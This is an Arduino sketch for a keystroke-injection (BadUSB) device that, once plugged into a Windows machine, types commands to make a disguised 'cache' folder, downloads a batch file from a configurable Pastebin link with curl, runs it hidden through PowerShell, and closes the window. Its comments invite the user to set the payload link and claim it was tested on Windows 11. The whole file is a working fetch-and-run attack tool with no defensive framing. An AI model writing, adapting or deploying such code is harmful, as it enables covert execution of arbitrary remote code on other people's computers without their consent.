#include <Keyboard.h>
/*

Edit the delay according to your needs.
The delay is in milliseconds.

Edit the folders according to your needs.

Edit the PASTEBIN_CODE_LINK with the link of the code you want to download.

Edit like 37 according to the shell you are using

THIS CODE WAS TESTED ON WINDOWS 11 24H2 (HP Notebook).

*/
void setup() {
  Keyboard.begin();
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(600);

  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(300);

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.print("mkdir \"%USERPROFILE%\\Documents\\cache\\bin\\windows\"");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(600);

  Keyboard.print("curl --insecure -o \"%USERPROFILE%\Documents\cache\bin\windows\system.bat\" \"{PASTEBIN_CODE_LINK}"");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);

  Keyboard.print("powershell Start-Process -FilePath \"%USERPROFILE%\\Documents\\cache\\bin\\windows\\system.bat\" -ArgumentList \"/B\" -WindowStyle Hidden");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(3500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
  delay(200);

  while (true); 
}

void loop() {
}
